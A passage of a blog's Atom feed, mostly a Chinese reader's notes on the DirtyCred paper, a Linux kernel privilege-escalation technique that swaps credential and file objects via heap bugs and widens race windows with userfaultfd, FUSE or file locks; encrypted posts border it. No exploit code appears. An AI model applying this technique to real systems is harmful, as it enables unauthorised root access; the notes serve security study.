a51d266e402239717c98aea8403f3851e4bc2177000cd9141fadbbda0edba880121b3541e9a7c08c87b43007e7a639fad03385b34394156f26623d1d480af1d75efcd77a41f4ec058ccad0c4bd7d4d6b10635e8eed9aacdfb8f5bb783a424aa94e8abad9bd213dbca1e403b6ca775f49b99576c82f2e9fba6327cae8ddc5d1b8a6c34dd6e25ecbf08d4e43960d8788c5e65f6e57862a702e6d11816c8472e14c9c92c4819be849f4c1e17003109abcefccef8ff395e9ce176d6bba0739f39124b7ecf8eb47a64a34a9a46b7115a156f3eb7bddaea2d900d1c63f008cac6ddc63748574f847a1f29fbdf33f6f6b29f2b238343bf8b67b76d7409bab9ea2a15a5331457bb9fa8a85641be02d8c0d9892eaf986dc32788e38f2c732922dc9de51b832c37e7c2de510ef37f6f6af00150a8f0f46cdfe51d7207021358d8cc654b82fb48366725620d928ec233de82a5fd8b355c2d4503a879db88715e3aee1dc5466e4288ea83eccf2be0a2b209a9e62ff6233f73cbf730d4229958c45841448bb9dd7d4b7e8724292e3d5ffc5fd8762042f7da273f242d2ec0ada3a6e2e23d632fa375817a181d0e6af758857daf6cbe60a23af71af2c601fe34dae6b16ec25c54f7d18bbcd1da798c4a846136860e3a5a7bf6d269454be1d7d126e1b3898502af4ac093f5cbabc3623125f164364b92777b295d0656528f7216810cb5d5ad8d3283da2bf88a6020c0f327f668b2fea5aa4fd3bd97fa22c3f7b0e8ca9b7d381cd49d1454ab19081ee568bc7723dbf03e05b5d1428ec1c5827aa61091542864f4f922c9cc4553944e0fe64484467c8452bff6886a05361515f60e1c2ebeacad1328db85d292277d2f62d91e6d9c3a700682000714733137dfdff0ef7cd6cfff5d3f771ac6b26086a186d7303343fd1bec744b54b65c522b783c1eb314d52a1ac71c059b40f3e9d792dc68fad71d4410833872a1f788a69048618e8f2118d33a90b92ca884fa4f4d8311b2fb0dc0bfaf709965391cf88586f7c9b581f5f95f8f11b67e967549e57c0cf39b9f6e2b5d3196c1cbe87ae15d85ec910c970099ceafc4d4a7cf9e971b078152999076aae72973e2b56dfaa9820a2e386d4929803afe241b806981062851e4d4e82fd63c9d51bafa5d911c9633563e23a91457da548411aabdd82e0fc714a8856a4810f23fa39ee5732d28540bd36e359c8e41212fa753ece97729da081e37518b03054876d6f727bc656b21722799ba354dea0a98ef142ec78f92a475cf6ce325590be0276dde54fcb78d90b6934fa42da37f3b7b7c56228cb4b81d09d7633d8797ffabc0c95140bb5c04381c8fe10e9194c70fd411fac9a5e1b85d9a62359a735ae860db0b71d7327b5d1d2363853f282bf49b3c470edabff9a516a7f27596c1a18686dd12baefe139ac5ea7279f203a89d83bca4a47acfc7610bc6ecb971a6008e40dc9a665d157fca72f9fd258cf2979edae543be4746609db3591bb93224907ae90848590ea9d70e86243fdc4edeb0d9e1726f96a06786e5631bfa14f5199056bb7697b2c4bec72c728ecdc3e85389b1fc262c87adb4506f8d5789405b0385df98820cd19d1cb2fd1f44acc0a1ff931611b0abde49d0466484a4ce05e74af58c3458f40cde2e80bd846cfac84608f197a37aebbd6516e34faa7026a82105cdc0de9524375843bf11070c7c3b22c01245ee6b636dc47f85011f5c33e6f5e67599c97f74d558220701e819d30ad48ec06bec8c62a3cc320d978eb59bf66f9768fd3c11cfb9d62911b2b3a95c2860cfdcafaad92f68a7650603c323cf66da058620e3e840d5ba6026b8eb9e5c51dda188860907761faffa7840e21f322e486f5344897025b070c2e25d114879974247e55d6c650536e371af97ce151d08d7f603297f851c3f65051fcec309825860f40dd9fffd93d6674135900565b8cb11fd59b4ea7ec4395114130efd700c34fb8b0a1a8a842b4c4a909842e39a348cfd97b93554f61d097450a13f2ccfbc02afb6989a096de1d2ca95374c6169addd92a90e03fa855324bfac79f8fc3e720acad7eab648dbcede2ee3bfd358683e14a86f08b742193d92ee201256c8246eed18d5654c52f70594cb99c235f7e21bf70709e87403110a37fbda14210e979b8ab3807c2c10e3f885653b1c70cd001dbbd752b9077ffe97ad280a000529e806eb3d1ac7bf115782a174b9f6e6820b60a68869c8f74f8e50cc03f71536363264aeca55b759e131e16e33dff15f178d412ae051cb89b0960e7a2ef24c0b68f34fd9a215214c951cc3203d110d4aadc364637a73a9306a2d57be6bb7c58f351b8d970ec1e73dcdb97065cf726e08bdff096aeca4cd01cf548c613bd938457c53e90c82e039f9d704884e81a1d61bb39926d1578d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">没写完，别急，急的话可以先看先知上的半成品</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">本文首发于先知社区：https://xz.aliyun.com/t/12439</summary>
    
    
    
    <category term="VIRUS" scheme="https://arttnba3.github.io/categories/VIRUS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="ROOTKIT" scheme="https://arttnba3.github.io/tags/ROOTKIT/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x05】论文笔记：DirtyCred: Escalating Privilege in Linux Kernel</title>
    <link href="https://arttnba3.github.io/2023/12/31/PAPER-0X05-DIRTY_CRED/"/>
    <id>https://arttnba3.github.io/2023/12/31/PAPER-0X05-DIRTY_CRED/</id>
    <published>2023-12-30T19:34:16.000Z</published>
    <updated>2023-12-30T19:59:18.137Z</updated>
    
    <content type="html"><![CDATA[<p>新瓶装旧酒的 114514 种写法</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>DirtyCred 在 <a href="https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf">blackhat usa 2022上的演讲 ppt</a> 和<a href="https://zplin.me/papers/DirtyCred.pdf">发在 CCS 上的论文</a>笔者很早就看过了，简而言之这个利用手法的思路其实算是比较容易理解的，所以理论上来说并没有必要专门写一篇博客，但是最近刚好需要做关于 DirtyCred 的技术分享，以及 12 🈷笔者暂且一篇技术型博客都还没有写，为了不破坏<a href="https://arttnba3.cn/2000/10/12/hello-world/#About-the-blog">曾经给自己定下来的规矩</a>，笔者决定简单水一篇关于 DirtyCred 的博客：）</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p><a href="https://arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/">DirtyPipe</a> 在安全社区引起了一阵狂欢，但这个手法限制太多了，因此作者给出新的类似的利用方法——<code>DirtyCred</code> ，通过篡改<strong>凭证</strong>（credential）结构体来进行利用，同时作者还给出了防范手段</p><p><strong>KEYWORDS</strong>：OS Security; Kernel Exploitation; Privilege Escalation</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><p>Linux 对于黑客们而言非常流行，但 KASLR、CFI 等防护手段让利用变得困难，因此 <a href="https://arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/">CVE-2022-0847</a> （DirtyPipe）的出现引发了热潮——她不需要与众多内核防护措施，但仍存在不够普适的缺陷</p><blockquote><p>笔者注：这里作者为了抬高自己的手法在前面贬低了一嘴 DirtyPipe 做铺垫，但其实将漏洞转换为 DirtyPipe 已经是非常常见的利用方式了，就笔者所知 DirtyPipe 比 DirtyCred 实际上<strong>适用性是更加广泛的，现在在 CTF 与真实世界漏洞利用中大家都倾向于将漏洞转为 DirtyPipe、而并非 DirtyCred 进行利用</strong>， <del>但是为了发论文嘛肯定得自吹自擂一手</del></p></blockquote><p>本文提出一种通用利用手法——<code>DirtyCred</code> ，其并不基于管道机制或是 CVE-2022-0847，而是通过堆漏洞将低权限的 credentials 结构体替换为高权限的 credentials，简而言之本文贡献如下：</p><ul><li>提出了新的利用手法 DirtyCred，其可以规避许多内核保护机制</li><li>证明了 DirtyCred 可以在真实世界漏洞中广泛进行利用</li><li>分析现有内核保护机制并设计出了一种新的保护机制</li></ul><h1 id="0x02-Background-amp-Threat-Model"><a href="#0x02-Background-amp-Threat-Model" class="headerlink" title="0x02. Background &amp; Threat Model"></a>0x02. Background &amp; Threat Model</h1><h2 id="2-1-Credentials-in-Linux-kernel"><a href="#2-1-Credentials-in-Linux-kernel" class="headerlink" title="2.1 Credentials in Linux kernel"></a>2.1 Credentials in Linux kernel</h2><p><strong>凭证</strong>（credentials）指内核中包含权限信息的东西，在 Linux 内核中被实现为带有权限信息的内核对象（包括 <code>cred</code>、<code>file</code>、<code>inode</code>，本文仅用前两个因为第三个仅会在创建文件时被分配）：</p><ul><li>Linux 内核中每个进程都有一个指向 <code>cred</code> 对象的指针，其中有着该进程的权限信息，如当进程要访问文件时便会检查 cred 的 UID；cred 对象还描述了能力（capability），如 <code>CAP_NET_BIND_SERVICE</code> 说明了进程可以将一个套接字绑定到一个端口上</li><li>Linux 内核中每个文件都有着对应的权限设置，且与 inode 对象绑定，在进程要打开文件前内核会调用 <code>inode_permission</code> 检查权限，在文件打开后 <code>file</code> 对象用以记录权限设置</li></ul><h2 id="2-2-Kernel-Heap-Memory-Management"><a href="#2-2-Kernel-Heap-Memory-Management" class="headerlink" title="2.2 Kernel Heap Memory Management"></a>2.2 Kernel Heap Memory Management</h2><blockquote><p>建议看 <a href="https://arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/">【OS.0x04】Linux 内核内存管理浅析 III - Slub Allocator</a></p></blockquote><p>内核堆对象有两种缓存池：</p><ul><li><strong>通用缓存</strong>（Generic Caches）：相同大小的都能从这类池中进行分配</li><li><strong>专用缓存</strong>（Dedicated Caches）：出于安全与性能目的考虑设计的仅供某些结构体分配的池</li></ul><h2 id="2-3-Threat-Model"><a href="#2-3-Threat-Model" class="headerlink" title="2.3 Threat Model"></a>2.3 Threat Model</h2><p>作者假设非特权本地用户可以访问 Linux 系统，目的是利用堆内存损坏漏洞进行提权，并假设上游（5.15）所有缓解措施与保护机制都已启用（包括KASLR、SMAP、SMEP、CFI、KPTI 等）</p><h1 id="0x03-Technical-Overview-amp-Challenges"><a href="#0x03-Technical-Overview-amp-Challenges" class="headerlink" title="0x03. Technical Overview &amp; Challenges"></a>0x03. Technical Overview &amp; Challenges</h1><h2 id="3-1-Overview"><a href="#3-1-Overview" class="headerlink" title="3.1 Overview"></a>3.1 Overview</h2><p>作者使用 CVE-2021-4154 作为例子说明 DirtyCred，这是一个 <code>fs_context</code> 对象错误引用 <code>file</code> 对象所导致的类型混淆错误，这允许将正在使用中的 <code>file</code> 进行释放</p><p>如图 1 所示：</p><ul><li>首先打开可写文件 <code>/tmp/x</code> 分配一个 <code>file</code> ，之后尝试进行数据写入，权限检查通过，之后 DirtyCred 将文件写入暂停</li><li>接下来触发漏洞将 <code>file</code> 结构体释放</li><li>之后打开只读文件 <code>/etc/passwd</code> 重新取回该 <code>file</code> 对象，并恢复数据写入，此时便成功完成越权写</li></ul><p>该例子只是用来说明 DirtyCred 如何利用 file 结构体进行利用，如 Section 2 所言，除了 <code>file</code> 以外，<code>cred</code> 也可以作为利用对象</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230070520.png"></p><p>从真实世界案例中可以看出 DirtyCred 不会劫持控制流，本质上是操纵内存中的内核对象，因此许多现有的控制流防护手段无法进行防御，一些工作（如 <a href="https://grsecurity.net/how_autoslab_changes_the_memory_unsafety_game/">AUTOSLAB</a>）则在对抗 DirtyCred，但如第 8 节所言其仍无法防御这种手段</p><h2 id="3-2-Technical-Challenges"><a href="#3-2-Technical-Challenges" class="headerlink" title="3.2 Technical Challenges"></a>3.2 Technical Challenges</h2><p>DirtyCred 仍面临一些挑战：</p><ul><li>DirtyCred 需要 invalid-free capability 去释放掉一个低权限对象并重新分配为高权限对象，这种能力通常难以获得，因此 DirtyCred 需要将漏洞的不同能力转为所需能力，我们将在第 4 节进行描述</li><li>DirtyCred 需要暂停文件写入操作，这同样是一个挑战，我们将在第 5 节中介绍可以达成该目标的多种机制</li><li>DirtyCred 的关键步骤是要用高权限凭证替换掉低权限的，但对于低权限用户而言分配高权限凭证也是一个挑战，我们将在第 6 节中给出解决方案</li></ul><h1 id="0x04-Pivoting-Vulnerability-Capability"><a href="#0x04-Pivoting-Vulnerability-Capability" class="headerlink" title="0x04. Pivoting Vulnerability Capability"></a>0x04. Pivoting Vulnerability Capability</h1><blockquote><p>Pwn 人基本功了嗷，憋和👴说你不会嗷</p></blockquote><p>虽然 CVE-2021-4154 展示了 DirtyCred 的威力，但实战中我们并不一定有这样的能力，因此我们需要进行能力转换（笔者注：漏洞迁移的概念）</p><h2 id="4-1-Pivoting-OOB-amp-UAF-Write"><a href="#4-1-Pivoting-OOB-amp-UAF-Write" class="headerlink" title="4.1 Pivoting OOB &amp; UAF Write"></a>4.1 Pivoting OOB &amp; UAF Write</h2><p>如图 2 所示，我们可以通过 partial overwrite 将包含指向凭证对象的指针的内核对象进行复写，使得两个指针指向同一个凭证对象，从而进行 DirtyCred，由于堆喷连续分配的结构体通常分组来自相同 slab，因此可行性很高</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230072228.png"></p><h2 id="4-2-Pivoting-DF"><a href="#4-2-Pivoting-DF" class="headerlink" title="4.2 Pivoting DF"></a>4.2 Pivoting DF</h2><p>通用缓存（如 <code>kmalloc-96</code>）与专用缓存（如 <code>cred_jar</code>）间存在隔离，但我们可以通过释放缓存页面并重新分配的方式使得跨缓存的内存操作成为可能，如图 3 所示，我们先分配大量对象，通过漏洞我们有两个指针指向同一对象，在大量分配后我们将其大量释放，并保留一个垂悬指针，之后再分配为凭证结构体对象，以此进行 DirtyCred</p><blockquote><p>笔者注：这个手法也出现在笔者近期供给某些 CTF 比赛中的 kernel pwn 题中，可惜怎么都是 0 解（恼）</p></blockquote><p>但如图 3(f) 所示，漏洞对象大小不一定匹配凭证对象大小，从而无法 DirtyCred，这种情况下我们需要保有两个指针，将其中一个释放掉从而构造出空内存槽以分配为凭证结构体，再进行释放以获取所需能力</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230072544.png"></p><h1 id="0x05-Extending-Time-Window"><a href="#0x05-Extending-Time-Window" class="headerlink" title="0x05. Extending Time Window"></a>0x05. Extending Time Window</h1><p>DirtyCred 需要我们延长权限检查到写入之间的时间窗口</p><h2 id="5-1-Exploitation-of-Userfaultfd-amp-FUSE"><a href="#5-1-Exploitation-of-Userfaultfd-amp-FUSE" class="headerlink" title="5.1 Exploitation of Userfaultfd &amp; FUSE"></a>5.1 Exploitation of Userfaultfd &amp; FUSE</h2><blockquote><p>简而言之长话短说可以参见<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd%EF%BC%88may-obsolete%EF%BC%89">这里</a></p></blockquote><p>userfaultfd 允许我们在用户态手动处理缺页异常，FUSE 允许我们实现用户空间文件系统，这为延长时间窗口提供了可行性，如读写注册了 userfaultfd 的内存页或是读写 FUSE 文件来触发我们的自定义 handler 函数</p><p>下面我们以 userfaultfd 为例（FUSE 利用方式类似），DirtyCred 通过系统调用 <code>writev()</code> 进行文件写入，不同于 <code>write()</code> 系统调用，其使用 <code>iovec</code> 向量来传递数据，如 List 1 所示，4.13 版本前的系统调用 <code>writev()</code> 首先进行权限检查，之后再通过 <code>iovec</code> 向量导入用户空间数据，最后才是写入，因此 DirtyCred 可以很轻易地使用 userfaultfd 的特性来获得合适的时间窗口</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230164326.png"></p><p>这项技术初见于 <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=808">CVE-2016-4557</a>，但现在已不再可用</p><h2 id="5-2-Alternative-Exploitation-of-Userfaultfd-amp-FUSE"><a href="#5-2-Alternative-Exploitation-of-Userfaultfd-amp-FUSE" class="headerlink" title="5.2 Alternative Exploitation of Userfaultfd &amp; FUSE"></a>5.2 Alternative Exploitation of Userfaultfd &amp; FUSE</h2><p>如 List 2 所示，在内核版本 4.13 之后导入 <code>iovec</code> 向量的步骤被移动到了权限检查之前，这使得我们不再能扩大权限检查与文件写入间的时间窗口，为了解决这个问题，DirtyCred 将利用 Linux 文件系统的设计</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230164938.png"></p><p>内核文件系统的设计遵循严格的层次关系，高层接口统一而低层接口各异，写入文件时会调用高层接口，如 List 3 所示， <code>generic_perform_write()</code> 为统一的高层接口，在第 15 ~ 17 行其会调用对应文件系统的写入操作，出于性能考虑内核在写入前会拷贝 iovec 向量数据，从而触发缺页异常，由此 DirtyCred 可以在第 10 行使用 userfaultfd 来延长时间窗口</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230201446.png"></p><p>与通过导入 <code>iovec</code> 来暂停内核的执行相比，对文件系统的设计进行利用则更难被缓解，如 List 3 中注释所言，移除 iovec 的 page fault 有可能造成死锁；将 page fault 移到权限检查前可能解决问题，但这会对性能造成影响，且仍存在潜在的被绕过的可能，如 DirtyCred 可以在 paeg fault 之后再移除该页，从而在拷贝时再次 page fault 以暂停（<del>有点扯了</del>）</p><h2 id="5-3-Exploitation-of-Lock-in-Filesystem"><a href="#5-3-Exploitation-of-Lock-in-Filesystem" class="headerlink" title="5.3 Exploitation of Lock in Filesystem"></a>5.3 Exploitation of Lock in Filesystem</h2><p>Linux 文件系统存在锁机制（如 List 4 为 ext4 中的锁），这为 DirtyCred 创造了机会，我们可以创建两个进程 A 与 B 同时写入同一文件，在 A 持有锁进行写入时 B 陷入等待，而在 <code>generic_perform_write()</code> 之前权限检查早已完成，由此 DirtyCred 可以通过写入大量数据来创造一个较长的时间窗口以完成 file 的替换（据作者观察写入 4GB 文件大概需要好几秒）</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230203419.png"></p><h1 id="0x06-Allocating-Privileged-Object"><a href="#0x06-Allocating-Privileged-Object" class="headerlink" title="0x06. Allocating Privileged Object"></a>0x06. Allocating Privileged Object</h1><p>DirtyCred 需要在内核空间分配特权对象，本节叙述如何以一个低权限用户做到这一点</p><h2 id="6-1-Allocation-from-Userspace"><a href="#6-1-Allocation-from-Userspace" class="headerlink" title="6.1 Allocation from Userspace"></a>6.1 Allocation from Userspace</h2><p><code>cred</code> 对象代表了对应内核进程的权限，因此 DirtyCred 可以通过执行 root-SUID 程序来创建 root 进程（而不用寻找这类程序中的漏洞），这样的程序包括 sudo、pkexec 等</p><p>DirtyCred 除了替换 <code>cred</code> 对象以外也可以通过替换 <code>file</code> 对象来提权，不过 <code>file</code> 对象的分配远比 <code>cred</code> 容易，以对应权限打开文件即可</p><h2 id="6-2-Allocation-from-Kernel-Space"><a href="#6-2-Allocation-from-Kernel-Space" class="headerlink" title="6.2  Allocation from Kernel Space"></a>6.2  Allocation from Kernel Space</h2><p>除了从用户空间分配特权对象以外，DirtyCred 也可以从内核空间分配特权对象，如生成新的特权内核线程完成特权凭证对象的分配，主要有两种方式：</p><ul><li>调用内核代码触发内核在内部生成特权线程，如通过向 <a href="https://docs.kernel.org/core-api/workqueue.html">工作队列</a> 提交任务让内核创建新的工作者线程</li><li>唤醒 usermode helper，如通过加载内核模块来让内核启动特权用户态 usermode helper 程序（如 modprobe）</li></ul><h1 id="0x07-Evaluation"><a href="#0x07-Evaluation" class="headerlink" title="0x07. Evaluation"></a>0x07. Evaluation</h1><p>作者设计了两个实验来在真实世界漏洞上评估 DirtyCred</p><h2 id="7-1-Experiment-Design-amp-Setup"><a href="#7-1-Experiment-Design-amp-Setup" class="headerlink" title="7.1 Experiment Design &amp; Setup"></a>7.1 Experiment Design &amp; Setup</h2><p>作者引入了一种自动化方法（设计实现参见附录 A）寻找可供 DirtyCred 利用的内核对象，并应用于 5.16.15 版本的内核</p><p>作者还探讨了针对实际漏洞利用的可行性，如第 4 节所言，若漏洞未直接提供交换凭证结构体的能力，则需要我们进行转换</p><p>作者假设 Linux 内核使用其最先进的防护手段，并在评估中仅选择 2019 年以后的 CVE，数据集如表 2 所示，这涵盖了几乎所有的堆上漏洞类型</p><h2 id="7-2-Experiment-Result"><a href="#7-2-Experiment-Result" class="headerlink" title="7.2 Experiment Result"></a>7.2 Experiment Result</h2><p><strong>可利用对象</strong>。表 1 展示了不同缓存池中可以被利用的内核对象，几乎所有通用缓存池（除了 <code>kmalloc-8</code> ）都有可供 DirtyCred 利用对象：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230204803.png"></p><p><strong>可利用性</strong>。表 2 显示了 DirtyCred 在不同漏洞上的可利用性，在开启所有防护的情况下其在 24 个漏洞中的 16 个上都完成了利用，这表明了其通用性与强大</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230205513.png"></p><blockquote><p>还有一些关于利用失败的阐述，这里笔者就不抄了</p></blockquote><h1 id="0x08-Defence-Against-DirtyCred"><a href="#0x08-Defence-Against-DirtyCred" class="headerlink" title="0x08. Defence Against DirtyCred"></a>0x08. Defence Against DirtyCred</h1><p>现有各种防护主要针对控制流劫持，难以对抗 DirtyCred，作者认为一种有效的对抗方式是隔离高权限与低权限对象，比较直接的想法是创建不同的缓存池，但这仍能通过跨缓存的页回收完成利用</p><p>基于上述考虑，作者设计的解决方案是为高权限对象在虚拟内存区域创建一个缓存（创建的凭证对象 ID 为 <code>GLOBAL_ROOT_UID</code> 时或以写权限打开文件时则使用 vmalloc 分配），同时低权限对象保留在正常内存区域，从而隔离开内存页；但运行时权限更改（如 setuid 系统调用）仍能破坏这种机制，作者的解决方案是为更改操作添加检查，若是改为 <code>GLOBAL_ROOT_UID</code> 则将高权限凭证对象复制到 vmalloc 区域而非更改原始对象，但这需要未来的内核开发遵循相同的模式，因此作者仍在探索替代解决方案</p><p>性能评估结果如表 3 所示：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230210827.png"></p><p>在这项工作中，作者称其主要目标是提高Linux社区的意识，而不是构建一个安全、高效的防御解决方案，且作者将探索替代防御解决方案作为未来研究的一部分</p><h1 id="0x09-Related-Work"><a href="#0x09-Related-Work" class="headerlink" title="0x09. Related Work"></a>0x09. Related Work</h1><p>这一节主要介绍与论文相关的两方面工作——内核利用（exploitation）与内核防护（defence），都是常识性内容所以这里笔者就不摘抄了：）</p><h1 id="0x10-Discussion-amp-Future-Work"><a href="#0x10-Discussion-amp-Future-Work" class="headerlink" title="0x10. Discussion &amp; Future Work"></a>0x10. Discussion &amp; Future Work</h1><p>这节讨论之前没提到的一些点：</p><ul><li><p><strong>Escaping container.</strong> 容器中的文件并不提供交换命名空间的能力，但<a href="https://www.datadoghq.com/blog/engineering/dirty-pipe-container-escape-poc/">一项最近的研究</a>显示攻击者可以被动等待 runC 进程，由此可以通过覆写进程来在 host 侧以 root 运行命令，DirtyCred 可以以此完成容器逃逸；利用 cred 对象则不需要被动等待，通过交换 cred 获得 <code>SYS_ADMIN</code> 权限使得攻击者可以挂载 cgroup 后利用 <code>notify_no_release</code> 机制来在 host 侧以 root 执行命令，作者在<a href="https://hackmd.io/giRE2P2oQHektZzOG053IQ">这里</a>给出了案例</p></li><li><p><strong>Rooting Android.</strong> 安卓也是 Linux 内核，DirtyCred 可以通过文中讨论的两种方式完成安卓提权，不过实战中安卓内核有着更严格的访问限制，直接交换 cred 是可行的，对于文件而言可以首先覆写共享库以完成沙箱逃逸，之后再覆写内核模块，作者在 0day 漏洞上用 DirtyCred 完成了利用并获得更Google 的致谢</p></li><li><p><strong>Cross version&#x2F;architecture exploitation.</strong> DirtyCred 的利用是跨版本跨架构的，因为其基本不需要内核信息，也不需要特定于架构的数据</p></li><li><p><strong>Other way to pivot capability.</strong> 虚拟内存区上的漏洞更难被转化为 DirtyCred，但不意味着无法使用 DirtyCred，如<a href="https://github.com/HexRabbit/CVE-writeup/tree/master/CVE-2021-34866">这个工作</a>将 vmalloc 区上的越界写漏洞 CVE-2021-34866 转为任意内存读写</p></li><li><p><strong>Stability.</strong> 稳定性主要受内存布局与漏洞触发方式影响，<a href="https://www.usenix.org/conference/usenixsecurity22/presentation/zeng">最近的一个工作</a>提出了一系列方法提高利用稳定性</p></li><li><p><strong>TOCTOU.</strong> （Time-Of-Check to Time-of-Use） DirtyCred 在关键时间窗口交换凭证对象，直觉告诉我们现有的 TOCTOU 防御方法可能会阻碍 DirtyCred，但针对<a href="https://ieeexplore.ieee.org/document/9718065/">最近一篇关于 TOCTOU 的研究文章</a>分析，实际上并不会，因为 DirtyCred 使用了意外的释放操作，而这在各种分析过程中不可见</p></li></ul><h1 id="0x11-Conclusion"><a href="#0x11-Conclusion" class="headerlink" title="0x11. Conclusion"></a>0x11. Conclusion</h1><p>作者开发了 Linux 内核通用利用手法 DirtyCred，很好很强大，撒花~🌸🌸🌸</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;新瓶装旧酒的 114514 种写法&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="Use After Free" scheme="https://arttnba3.github.io/tags/Use-After-Free/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="Kernel UAF" scheme="https://arttnba3.github.io/tags/Kernel-UAF/"/>
    
    <category term="Heap Overflow" scheme="https://arttnba3.github.io/tags/Heap-Overflow/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【PIECES.0x05】过量电波重度依赖：再别电专</title>
    <link href="https://arttnba3.github.io/2023/12/21/PIECES-0X05-NEEDY_A3_OVERDOSE-0-GOODBYE_XDU/"/>
    <id>https://arttnba3.github.io/2023/12/21/PIECES-0X05-NEEDY_A3_OVERDOSE-0-GOODBYE_XDU/</id>
    <published>2023-12-20T19:30:41.000Z</published>
    <updated>2023-12-30T21:38:47.114Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码出错啦！但是题目还没出好所以暂且请等待..." data-whm="还请不要做一些奇奇怪怪的事情！">  <script id="hbeData" type="hbeData" data-hmacdigest="4de51144639fa16a8ecbdfa6582d90c8d1f285c11113223e663031ab4ef51287">f4186fb4192fa911fd4cd5c6f8b3def692d6faa5b6d746477cdf302dc764b950561e745c78f1c2766333c32886c5952b6e980ae7cf9867d465b2910ea68de50562b3d6037eb63a410a04c38f48922f102bb2f4b3db916837be31b0411cc81c5bcd8a92d70a5115129535e22060e291d45a9ee6aeb5facae4ca490abfcd362eeb9b4f732a53ed084f4bcec789cd881ff4c5e061e10609c659b0fa03a0059e40c04e7de63cdd73a94cfb68a11991ba5951d7162b02b9755c65e49e6b1f4d013ae0a220731d448c29a2f3da06ddc23308e787f46607e7f90f66a005af1b876ee2d42e9fc90aa80bababaf545fdaaec8467928a580c60b3d93bb14533c398a46f3d1f16d104b2ec855562677e6b0b8e949ffbcde6a581684bd4b3e83400f9d9d9369a047793a9cf039dcbb07a089c872773ad25033b8c8ecd6280d163bd3810aab1ac97d731bef2b25e898ab0ae64e99e1f8bd51fbdd9b7f7e1219137347672122b962819a62d63160ea2c853a130e7c53519c3cca2b7d61c18f427b09f3db01cfa5fdca0080c2d3d78353676b9b495714c5eded101a1a89a210717899a948835d8e41e82715935a5da67588e3fa86fc6fe490a0b7e2b4cbfd1a6ef02a9d68aea9043e6eab7207493412f4e2327205009a76c3afe25dd58b1ed0a0e9308da21b2c2944c916ccc700e3e85a35fce8f2ab7f560dd826205ad5985bca2020a6ecdc56d4a54e3ffa27cdd8db1678b1806ee205ad6c1db5b4d9e4b63da59fbc84ca252e2ae5ebc4556116dd4b6af7e6b3898922ffa8417368c5b0499f744d52de6e05a6b2188b70efa8c2320da88d085a4cdc6779a50f069e6aea4b20f66992d345a4d165cccb6384ad2bf2c8d2122a6912719af6487a14b53f6c46ba6f6a9c769a6a9a75e54de141ddc8c902df0818f1e2fde45a32f32cc809a751f5a61d8161be5f14c9863aee5bf029bb1ca5e09d1c027ec4d10975933845acb5f9b1c4455a73cb256803b1704097de257df417cb9776858370edc1fe614e5a1077704177b11cca54bee14c3745e92605329be1d266e3351d016692f6be7e4f3bf74b77065f45c9b22c1085e535cce4fbcdabcd3348f065df16bda887d6268e2efe6ba74028d77966f31356148da14496374014d2f13d72979fabcfdd900f89806d886349678dd8eecf1ac534e168fcf3089bb3deb767b0653a3dfb12df72b8aa74f9e973bc4eac5282109448887fb0903b7607209bac87f2f0cb54f4997c211d5b6e0829a97df025ec1a7553ddc1c7a7a306dccb0ba72e24d5ef856982ca30838ddefd9bf6ff81a613167f2257a05826b872a0e48aee9b3587cec4768afb8047d49a1ee5efd95f7a2d191d09c744e2a08ecc8153109a8abc2d463634b5a995f46683325ca12debaa92e2ac8acc987e025de95957eab0b6c4e10a67cac2d83432f10fd4a5bbdcb9acd414b61f307d3ce5816d3ac266933635d55897a620c77af283a168e35aad6fc239cf4a74d9f6b61041cad19655b44e95a25490d283584f97f95